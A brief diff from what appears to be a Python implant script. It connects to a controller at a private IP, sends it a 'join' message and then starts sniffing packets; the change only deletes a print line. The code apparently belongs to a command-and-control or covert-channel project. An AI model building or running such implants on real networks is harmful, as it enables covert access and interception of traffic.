@@ -42,7 +42,6 @@ if __name__ == "__main__":
     implant = Implant(controller_ip="192.168.157.6")
     print(implant)
     # Send join command
-    print(" $ Sent join command")
     implant.send(implant.controller_ip, "join", "hello how are you")
 
     # Start sniffing
